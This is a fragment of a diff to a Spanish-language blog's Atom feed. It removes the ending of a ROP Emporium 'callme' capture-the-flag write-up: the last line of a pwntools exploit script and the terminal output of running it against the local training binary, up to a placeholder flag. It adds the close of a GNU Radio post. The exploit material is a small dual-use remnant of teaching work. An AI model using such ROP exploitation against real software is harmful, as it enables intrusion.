-&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Y ya tenemos la flag&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;󰣇  c4rta /tmp/callme  python3 exploit.py
-[+] Starting local process './callme': pid 15024
-[+] Receiving all data: Done (172B)
-[*] Process './callme' stopped with exit code 0 (pid 15024)
-callme by ROP Emporium
-x86_64
-
-Hope you read the instructions...
-
-&amp;gt; Thank you!
-callme_one() called correctly
-callme_two() called correctly
-ROPE{a_placeholder_32byte_flag!}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Eso ha sido todo, gracias por leer ❤&lt;/p&gt;</content><author><name>c4rta</name></author><category term="posts" /><category term="ROP" /><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="/assets/img/callme/SUSwaifu.gif" /><media:content medium="image" url="/assets/img/callme/SUSwaifu.gif" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
+&lt;p&gt;Eso ha sido todo, gracias por leer, espero que te haya gustado este tema, por que seguire subiendo cosillas interesantes que se pueden hacer con GNU radio ❤&lt;/p&gt;</content><author><name>c4rta</name></author><category term="posts" /><category term="GNU radio" /><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="/assets/img/GNUradio-IQ/waifu.gif" /><media:content medium="image" url="/assets/img/GNUradio-IQ/waifu.gif" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
